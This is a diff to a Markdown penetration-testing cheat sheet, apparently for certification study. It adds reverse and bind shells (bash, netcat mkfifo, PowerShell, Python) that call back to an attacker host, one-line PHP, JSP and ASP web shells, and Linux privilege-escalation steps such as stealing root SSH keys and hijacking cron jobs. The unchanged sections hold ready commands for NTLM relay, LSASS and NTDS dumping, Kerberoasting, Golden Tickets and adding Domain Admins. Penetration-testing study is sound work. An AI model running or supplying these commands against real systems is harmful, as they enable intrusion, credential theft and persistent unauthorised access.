@@ -51,6 +51,12 @@
     - `4.2.1` psexec module
   - `4.3` **RDP**
     - `4.3.1` xfreerdp
+  - `4.4` **Shell Access**
+    - `4.4.1` Reverse shells
+    - `4.4.2` Bind shells
+    - `4.4.3` Web shells
+    - `4.4.4` TTY upgrade
+    - `4.4.5` Base64 file transfer
 - `5` **Active Directory Enumeration**
   - `5.1` ldapdomaindump
   - `5.2` BloodHound
@@ -78,6 +84,20 @@
   - `7.1` **User and Group Manipulation**
   - `7.2` Dumping NTDS.dit
   - `7.3` Golden Ticket Attack
+- `8` **Privilege Escalation**
+  - `8.1` **Automated Enumeration**
+    - `8.1.1` LinPEAS
+    - `8.1.2` WinPEAS
+  - `8.2` **Linux — Manual Checks**
+    - `8.2.1` Kernel version & exploits
+    - `8.2.2` Sudo privileges
+    - `8.2.3` SUID / SGID binaries
+    - `8.2.4` Cron jobs
+    - `8.2.5` Exposed credentials
+    - `8.2.6` SSH keys
+    - `8.2.7` Writable PATH directories
+    - `8.2.8` Installed software
+  - `8.3` **Useful Resources
 
 ## 1. Host Discovery
 
@@ -85,7 +105,7 @@
 
 #### 1.1.1 ARP
 
-##### 1.1.1.1 arp-scan <sup>· PJPT</sup>
+##### 1.1.1.1 arp-scan
 
 ```bash
 sudo arp-scan -I <INTERFACE> --localnet
@@ -106,7 +126,7 @@ sudo arp-scan -I <INTERFACE> --localnet
 
 </details>
 
-##### 1.1.1.2 Netdiscover <sup>· PJPT</sup>
+##### 1.1.1.2 Netdiscover
 
 ```bash
 sudo netdiscover -i <INTERFACE> -r <IP/MASK>
@@ -127,7 +147,7 @@ sudo netdiscover -i <INTERFACE> -r <IP/MASK>
 
 </details>
 
-#### 1.1.2 ICMP range sweep <sup>· CPTS</sup>
+#### 1.1.2 ICMP range sweep
 
 ```bash
 fping -a -g <IP/MASK> 2>/dev/null
@@ -154,7 +174,7 @@ fping -a -g <IP/MASK> 2>/dev/null
 
 #### 1.2.1 Nmap
 
-##### 1.2.1.1 TCP SYN probes <sup>· CPTS</sup>
+##### 1.2.1.1 TCP SYN probes
 
 ```bash
 sudo nmap -sn -PS22,80,443 <IP/MASK>
@@ -176,7 +196,7 @@ sudo nmap -sn -PS22,80,443 <IP/MASK>
 
 </details>
 
-##### 1.2.1.2 TCP ACK probes <sup>· CPTS</sup>
+##### 1.2.1.2 TCP ACK probes
 
 ```bash
 sudo nmap -sn -PA80,443 <IP/MASK>
@@ -198,7 +218,7 @@ sudo nmap -sn -PA80,443 <IP/MASK>
 
 </details>
 
-##### 1.2.1.3 UDP service probes <sup>· CPTS</sup>
+##### 1.2.1.3 UDP service probes
 
 ```bash
 sudo nmap -sn -PU53,123,161 <IP/MASK>
@@ -221,7 +241,7 @@ sudo nmap -sn -PU53,123,161 <IP/MASK>
 
 </details>
 
-##### 1.2.1.4 Host-only sweep <sup>· CPTS</sup>
+##### 1.2.1.4 Host-only sweep
 
 ```bash
 nmap -sn -n <IP/MASK>
@@ -247,7 +267,7 @@ nmap -sn -n <IP/MASK>
 
 ### 2.1 Nmap
 
-#### 2.1.1 Aggressive all-port scan <sup>· PJPT</sup>
+#### 2.1.1 Aggressive all-port scan
 
 ```bash
 nmap -T4 -p- -A <IP/MASK>
@@ -270,7 +290,7 @@ nmap -T4 -p- -A <IP/MASK>
 
 </details>
 
-#### 2.1.2 SYN stealth with default scripts <sup>· PJPT</sup>
+#### 2.1.2 SYN stealth with default scripts
 
 ```bash
 nmap -T4 -p- -sS -sC <IP/MASK>
@@ -296,7 +316,7 @@ nmap -T4 -p- -sS -sC <IP/MASK>
 
 ### 2.2 SNMP Enumeration
 
-#### 2.2.1 snmpwalk community string query <sup>· PJPT</sup>
+#### 2.2.1 snmpwalk community string query
 
 ```bash
 snmpwalk -v 2c -c <COMMUNITY_STRING> <TARGET_IP> <OID>
@@ -322,7 +342,7 @@ snmpwalk -v 2c -c <COMMUNITY_STRING> <TARGET_IP> <OID>
 
 </details>
 
-#### 2.2.2 onesixtyone community string brute force <sup>· PJPT</sup>
+#### 2.2.2 onesixtyone community string brute force
 
 ```bash
 onesixtyone -c <DICT_FILE> <TARGET_IP>
@@ -348,7 +368,7 @@ onesixtyone -c <DICT_FILE> <TARGET_IP>
 
 ### 2.3 Web Content Discovery
 
-#### 2.3.1 gobuster directory enumeration <sup>· PJPT</sup>
+#### 2.3.1 gobuster directory enumeration
 
 ```bash
 gobuster dir -u <TARGET_URL> -w /usr/share/seclists/Discovery/Web-Content/common.txt
@@ -380,7 +400,7 @@ gobuster dir -u <TARGET_URL> -w /usr/share/seclists/Discovery/Web-Content/common
 
 </details>
 
-#### 2.3.2 gobuster DNS subdomain enumeration <sup>· PJPT</sup>
+#### 2.3.2 gobuster DNS subdomain enumeration
 
 ```bash
 gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt
@@ -403,7 +423,7 @@ gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt
 
 </details>
 
-#### 2.3.3 curl banner grabbing <sup>· PJPT</sup>
+#### 2.3.3 curl banner grabbing
 
 ```bash
 curl -IL <TARGET_URL>
@@ -421,7 +441,7 @@ curl -IL <TARGET_URL>
 
 </details>
 
-#### 2.3.4 whatweb technology fingerprinting <sup>· PJPT</sup>
+#### 2.3.4 whatweb technology fingerprinting
 
 **Single target:**
 
@@ -455,7 +475,7 @@ whatweb --no-errors <IP/MASK>
 
 ### 3.1 LLMNR/NBT-NS Poisoning
 
-#### 3.1.1 Responder hash capture <sup>· PJPT</sup>
+#### 3.1.1 Responder hash capture
 
 ```bash
 sudo responder -I <INTERFACE> -dP
@@ -477,7 +497,7 @@ sudo responder -I <INTERFACE> -dP
 
 </details>
 
-#### 3.1.2 Cracking NTLMv2 hashes <sup>· PJPT</sup>
+#### 3.1.2 Cracking NTLMv2 hashes
 
 **With hashcat:**
 
@@ -510,7 +530,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>
 
 ### 3.2 SMB Relay Attack
 
-#### 3.2.1 Enumerate SMB signing <sup>· PJPT</sup>
+#### 3.2.1 Enumerate SMB signing
 
 ```bash
 nmap -p445 <IP/MASK> --script=smb2-security-mode
@@ -533,7 +553,7 @@ nmap -p445 <IP/MASK> --script=smb2-security-mode
 
 </details>
 
-#### 3.2.2 Responder relay configuration <sup>· PJPT</sup>
+#### 3.2.2 Responder relay configuration
 
 Edit the Responder configuration to disable SMB and HTTP services:
 
@@ -564,7 +584,7 @@ sudo responder -I <INTERFACE> -dP
 
 </details>
 
-#### 3.2.3 impacket-ntlmrelayx <sup>· PJPT</sup>
+#### 3.2.3 impacket-ntlmrelayx
 
 **Dump password hashes:**
 
@@ -603,7 +623,7 @@ sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support -c "whoami"
 
 ### 3.3 IPv6 mitm6 Attack
 
-#### 3.3.1 mitm6 <sup>· PJPT</sup>
+#### 3.3.1 mitm6
 
 ```bash
 sudo mitm6 -d <DOMAIN>
@@ -624,7 +644,7 @@ sudo mitm6 -d <DOMAIN>
 
 </details>
 
-#### 3.3.2 impacket-ntlmrelayx (IPv6 relay) <sup>· PJPT</sup>
+#### 3.3.2 impacket-ntlmrelayx (IPv6 relay)
 
 ```bash
 sudo impacket-ntlmrelayx -6 -t ldap://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR>
@@ -651,7 +671,7 @@ sudo impacket-ntlmrelayx -6 -t ldap://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR
 
 ### 3.4 SMB Share Enumeration
 
-#### 3.4.1 smbclient share listing <sup>· PJPT</sup>
+#### 3.4.1 smbclient share listing
 
 **Anonymous listing (null session):**
 
@@ -691,7 +711,7 @@ smb: \> put <FILE>
 
 </details>
 
-#### 3.4.2 crackmapexec share enumeration <sup>· PJPT</sup>
+#### 3.4.2 crackmapexec share enumeration
 
 ```bash
 crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --shares
@@ -715,7 +735,7 @@ crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --shares
 
 ### 3.5 SMB Share File-Based Attacks
 
-#### 3.5.1 Upload .scf / .lnk files <sup>· PJPT</sup>
+#### 3.5.1 Upload .scf / .lnk files
 
 **Create a malicious .scf file:**
 
@@ -764,7 +784,7 @@ smb: \> put pwn.lnk
 
 ### 4.1 Impacket
 
-#### 4.1.1 impacket-psexec <sup>· PJPT</sup>
+#### 4.1.1 impacket-psexec
 
 **For domain users:**
 
@@ -802,7 +822,7 @@ impacket-psexec <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
 
 </details>
 
-#### 4.1.2 impacket-wmiexec <sup>· PJPT</sup>
+#### 4.1.2 impacket-wmiexec
 
 ```bash
 impacket-wmiexec <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
@@ -823,7 +843,7 @@ impacket-wmiexec <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
 
 </details>
 
-#### 4.1.3 impacket-smbexec <sup>· PJPT</sup>
+#### 4.1.3 impacket-smbexec
 
 ```bash
 impacket-smbexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
@@ -841,7 +861,7 @@ impacket-smbexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
 
 ### 4.2 Metasploit
 
-#### 4.2.1 psexec module <sup>· PJPT</sup>
+#### 4.2.1 psexec module
 
 ```
 use exploit/windows/smb/psexec
@@ -871,7 +891,7 @@ run
 
 ### 4.3 RDP
 
-#### 4.3.1 xfreerdp <sup>· PJPT</sup>
+#### 4.3.1 xfreerdp
 
 **For domain users:**
 
@@ -903,9 +923,176 @@ xfreerdp /v:<TARGET_IP> /u:.\<USERNAME> /p:'<PASSWORD>' /cert:ignore
 
 </details>
 
+### 4.4 Shell Access
+
+#### 4.4.1 Reverse shells
+
+**Listener (attacker):**
+
+```bash
+nc -lvnp <LPORT>
+```
+
+**Bash (bash built-in):**
+
+```bash
+bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
+```
+
+**Bash (mkfifo — more reliable):**
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
+```
+
+**PowerShell:**
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- The reverse shell connects back to the attacker's listener, giving interactive command execution on the target.
+- The mkfifo variant is more reliable under adverse conditions than bash's `/dev/tcp` pseudo-device.
+- The PowerShell variant uses `System.Net.Sockets.TCPClient` for an interactive PowerShell session.
+
+**Netcat Options**
+
+`-l` — Listen for inbound connections.  
+`-v` — Verbose output.  
+`-n` — Skip DNS resolution.  
+`-p <LPORT>` — Port to listen on.
+
+</details>
+
+#### 4.4.2 Bind shells
+
+**Connection (attacker):**
+
+```bash
+nc <TARGET_IP> <LPORT>
+```
+
+**Bash (mkfifo):**
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <LPORT> >/tmp/f
+```
+
+**Python:**
+
+```bash
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<LPORT>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+
+**PowerShell:**
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<LPORT>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- The bind shell opens a listening port on the target; the attacker connects to it with netcat.
+- Unlike reverse shells, the connection does not need to traverse NAT or firewalls outbound.
+- If the connection drops, reconnecting is possible without re-exploiting as long as the bind listener is still running.
+
+</details>
+
+#### 4.4.3 Web shells
+
+**PHP:**
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+**JSP:**
+
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+**ASP:**
+
+```asp
+<% eval request("cmd") %>
+```
+
+**Default webroots:** Apache `/var/www/html/`, Nginx `/usr/local/nginx/html/`, IIS `c:\inetpub\wwwroot\`, XAMPP `C:\xampp\htdocs\`.
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- A web shell accepts commands via HTTP parameters and prints output back on the page.
+- Bypasses firewalls by running on the existing web port (80/443) rather than opening a new connection.
+- Persists across reboots — the file stays on disk until removed.
+
+</details>
+
+#### 4.4.4 TTY upgrade
+
+```bash
+# In the netcat shell:
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# Ctrl+Z to background, then on YOUR terminal:
+stty raw -echo
+fg
+
+# Press Enter twice, then in the shell:
+export TERM=xterm-256color
+stty rows <ROWS> columns <COLS>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Upgrades a limited netcat shell to a full TTY with tab completion, arrow keys, and job control.
+- Run `stty size` in a second local terminal to get the correct `<ROWS>` and `<COLS>` values.
+- Without this step, the shell is line-based and fragile; with it, it behaves like SSH.
+
+</details>
+
+#### 4.4.5 Base64 file transfer
+
+**Encode on attacker machine:**
+
+```bash
+base64 <FILE> -w 0
+```
+
+**Decode on remote host:**
+
+```bash
+echo <BASE64_STRING> | base64 -d > <OUTPUT_FILE>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Use when direct download is blocked by firewalls or restricted outbound connectivity.
+- Base64 encoding increases size by ~33%, but works over any shell connection since it's just text.
+- The `-w 0` flag disables line wrapping in the base64 output — ensures a single pastable string.
+
+</details>
+
 ## 5. Active Directory Enumeration
 
-### 5.1 ldapdomaindump <sup>· PJPT</sup>
+### 5.1 ldapdomaindump
 
 ```bash
 sudo ldapdomaindump ldaps://<DC_IP> -u '<DOMAIN>\\<USERNAME>' -p <PASSWORD>
@@ -935,7 +1122,7 @@ ldapdomaindump -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' <DC_IP> -o <OUTPUT_DIR>
 
 </details>
 
-### 5.2 BloodHound <sup>· PJPT</sup>
+### 5.2 BloodHound
 
 **Collect data with BloodHound-Python (v1.9.0):**
 
@@ -983,7 +1170,7 @@ Drag and drop the generated JSON files (or ZIP) into the BloodHound GUI.
 
 </details>
 
-### 5.3 PlumHound <sup>· PJPT</sup>
+### 5.3 PlumHound
 
 **PlumHound v1.7.8:**
 
@@ -1024,7 +1211,7 @@ python PlumHound.py \
 
 </details>
 
-### 5.4 impacket-samrdump <sup>· PJPT</sup>
+### 5.4 impacket-samrdump
 
 ```bash
 impacket-samrdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
@@ -1046,7 +1233,7 @@ impacket-samrdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
 
 </details>
 
-### 5.5 impacket-lookupsid <sup>· PJPT</sup>
+### 5.5 impacket-lookupsid
 
 ```bash
 impacket-lookupsid <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
@@ -1072,7 +1259,7 @@ impacket-lookupsid <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
 
 ### 6.1 crackmapexec Suite
 
-#### 6.1.1 Credential validation <sup>· PJPT</sup>
+#### 6.1.1 Credential validation
 
 **Validate credentials across the network via SMB:**
 
@@ -1106,7 +1293,7 @@ crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -H <NTLM_HASH>
 
 </details>
 
-#### 6.1.2 SAM / LSA dump <sup>· PJPT</sup>
+#### 6.1.2 SAM / LSA dump
 
 **Dump SAM hashes:**
 
@@ -1131,7 +1318,7 @@ crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --lsa
 
 </details>
 
-#### 6.1.3 LSASS dump (lsassy) <sup>· PJPT</sup>
+#### 6.1.3 LSASS dump (lsassy)
 
 ```bash
 crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -M lsassy
@@ -1148,7 +1335,7 @@ crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -M lsassy
 
 </details>
 
-#### 6.1.4 Password spraying <sup>· PJPT</sup>
+#### 6.1.4 Password spraying
 
 **Spray a password against a list of users:**
 
@@ -1179,7 +1366,7 @@ crackmapexec smb <IP/MASK> -u <USERS_FILE> -H <NTLM_HASH> --continue-on-success
 
 </details>
 
-#### 6.1.5 Local authentication & cmedb <sup>· PJPT</sup>
+#### 6.1.5 Local authentication & cmedb
 
 **Test local credentials (non-domain):**
 
@@ -1204,7 +1391,7 @@ cmedb
 
 </details>
 
-### 6.2 impacket-secretsdump <sup>· PJPT</sup>
+### 6.2 impacket-secretsdump
 
 **Dump local hashes with credentials:**
 
@@ -1238,7 +1425,7 @@ impacket-secretsdump <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
 
 ### 6.3 Kerberoasting
 
-#### 6.3.1 impacket-GetUserSPNs <sup>· PJPT</sup>
+#### 6.3.1 impacket-GetUserSPNs
 
 ```bash
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE>
@@ -1262,7 +1449,7 @@ impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request -out
 
 </details>
 
-#### 6.3.2 Cracking TGS hashes <sup>· PJPT</sup>
+#### 6.3.2 Cracking TGS hashes
 
 **With hashcat:**
 
@@ -1294,7 +1481,7 @@ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt <TGS_HASH_FILE
 
 </details>
 
-### 6.4 Token Impersonation <sup>· PJPT</sup>
+### 6.4 Token Impersonation
 
 **Load the incognito module:**
 
@@ -1333,7 +1520,7 @@ impersonate_token DOMAIN\\USERNAME
 
 ### 6.5 Credential Dumping
 
-#### 6.5.1 Mimikatz <sup>· PJPT</sup>
+#### 6.5.1 Mimikatz
 
 ```
 privilege::debug
@@ -1361,7 +1548,7 @@ kerberos::list
 
 </details>
 
-#### 6.5.2 LSASS dump via Task Manager <sup>· PJPT</sup>
+#### 6.5.2 LSASS dump via Task Manager
 
 1. Open Task Manager → **Details** tab
 2. Find `lsass.exe`
@@ -1383,7 +1570,7 @@ pypykatz lsa minidump <LSASS_DUMP>
 
 </details>
 
-#### 6.5.3 LSASS dump via procdump <sup>· PJPT</sup>
+#### 6.5.3 LSASS dump via procdump
 
 ```bash
 procdump.exe -accepteula -ma lsass.exe <DUMP_FILE>
@@ -1420,7 +1607,7 @@ procdump.exe -accepteula -ma <PID> <DUMP_FILE>
 
 </details>
 
-### 6.6 GPP / cPassword Attacks <sup>· PJPT</sup>
+### 6.6 GPP / cPassword Attacks
 
 **Find cPassword in SYSVOL with Metasploit:**
 
@@ -1459,7 +1646,7 @@ gpp-decrypt <CIPHERED_PASSWORD>
 
 ## 7. Persistence & Domain Dominance
 
-### 7.1 User and Group Manipulation <sup>· PJPT</sup>
+### 7.1 User and Group Manipulation
 
 **Create a local user and add to the local Administrators group:**
 
@@ -1487,7 +1674,7 @@ net group "Domain Admins" <USERNAME> /ADD /DOMAIN
 
 </details>
 
-### 7.2 Dumping NTDS.dit <sup>· PJPT</sup>
+### 7.2 Dumping NTDS.dit
 
 ```bash
 impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP> -just-dc-ntlm
@@ -1510,7 +1697,7 @@ impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP> -just-dc-ntlm
 
 </details>
 
-### 7.3 Golden Ticket Attack <sup>· PJPT</sup>
+### 7.3 Golden Ticket Attack
 
 **Execute in Mimikatz:**
 
@@ -1547,3 +1734,206 @@ dir \\<MACHINE_NAME>\c$
 - `dir \\<MACHINE_NAME>\c$` — Tests access to a remote machine's C$ administrative share.
 
 </details>
+
+## 8. Privilege Escalation
+
+### 8.1 Automated Enumeration
+
+#### 8.1.1 LinPEAS
+
+```bash
+./linpeas.sh
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Enumerates the Linux system for privilege escalation vectors and colour-codes findings.
+- Red/yellow results indicate high-confidence opportunities; green results are common informational items.
+- If LinPEAS triggers AV/EDR or fails, fall back to manual checks in [8.2](#82-linux--manual-checks).
+
+**Reference:** [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng)
+
+</details>
+
+#### 8.1.2 WinPEAS
+
+```powershell
+.\winPEAS.exe
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Windows equivalent of LinPEAS; enumerates services, tokens, registry, and installed software for privesc opportunities.
+- Same colour-coding convention as LinPEAS.
+
+**Reference:** [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng)
+
+</details>
+
+### 8.2 Linux — Manual Checks
+
+#### 8.2.1 Kernel version & exploits
+
+```bash
+uname -a
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Identifies the kernel version to check for known exploits.
+- Cross-reference with `searchsploit` or the [HackTricks Linux Checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist).
+
+</details>
+
+#### 8.2.2 Sudo privileges
+
+```bash
+sudo -l
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Lists commands the current user can run as another user via sudo.
+- If a command appears without a password (`NOPASSWD`) or restricted to a specific user, check [GTFOBins](https://gtfobins.github.io/) for exploitation methods.
+
+</details>
+
+#### 8.2.3 SUID / SGID binaries
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- A binary with the **SUID** bit set (`rws` in owner permissions) runs with the privileges of its **owner** (usually root), no matter who executes it. `find -perm -4000` finds all such binaries on the system.
+- **SGID** (`rws` in group permissions) runs with the file's **group** privileges instead. `find -perm -2000` finds these.
+- If a non-standard binary appears in either list, check [GTFOBins](https://gtfobins.github.io/) to see if it can be abused to execute commands as root or the file's group.
+
+</details>
+
+#### 8.2.4 Cron jobs
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /var/spool/cron/crontabs/
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Lists scheduled tasks. If a script referenced in a cron job is writable by your user, replace it with a malicious script to gain execution as the cron job's owner (usually root).
+- Also check for cron directories that are world-writable.
+
+</details>
+
+#### 8.2.5 Exposed credentials
+
+```bash
+cat ~/.bash_history
+grep -r "password" /var/www/ /etc/ 2>/dev/null
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Shell history files often contain passwords passed as command-line arguments.
+- Configuration files in `/var/www/` (web roots) and `/etc/` frequently contain database credentials.
+- Found credentials should be tested against users via `su` or SSH for password reuse.
+
+</details>
+
+#### 8.2.6 SSH keys
+
+**Read — escalation:**
+
+```bash
+find / -name id_rsa 2>/dev/null
+cat ~/.ssh/id_rsa
+cat /root/.ssh/id_rsa
+```
+
+Copy the key to your machine and connect:
+
+```bash
+chmod 600 <KEY_FILE>
+ssh -i <KEY_FILE> <USER>@<TARGET>
+```
+
+**Write — persistence:**
+
+```bash
+echo "<PUBLIC_KEY>" >> ~/.ssh/authorized_keys
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- If a private SSH key (e.g. `/root/.ssh/id_rsa`) is **readable** by your user, copy it to your machine and authenticate as that user over SSH. This directly escalates privileges if the key belongs to root.
+- If you already have access as a user, **appending** your public key to `~/.ssh/authorized_keys` provides persistent SSH access. SSH refuses keys written by other users, so this only works when you are already that user.
+
+</details>
+
+#### 8.2.7 Writable PATH directories
+
+```bash
+find / -writable -type d 2>/dev/null
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- If a world-writable directory appears early in `$PATH` or is referenced by a cron job or SUID binary, place a malicious binary there to hijack execution.
+- Common candidates: `/tmp`, `/dev/shm`, or misconfigured user home directories.
+
+</details>
+
+#### 8.2.8 Installed software
+
+```bash
+dpkg -l 2>/dev/null || rpm -qa
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Lists installed packages. Cross-reference outdated versions with `searchsploit` to find public exploits.
+
+</details>
+
+### 8.3 Useful Resources
+
+| Resource | Purpose |
+|---|---|
+| [HackTricks Linux Checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) | Step-by-step Linux privesc checklist |
+| [HackTricks Windows Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation) | Step-by-step Windows privesc checklist |
+| [GTFOBins](https://gtfobins.github.io/) | Exploitable sudo/SUID/SGID binaries on Linux |
+| [LOLBAS](https://lolbas-project.github.io/) | Living-off-the-land binaries on Windows |
+| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Comprehensive privesc techniques for both OSes |
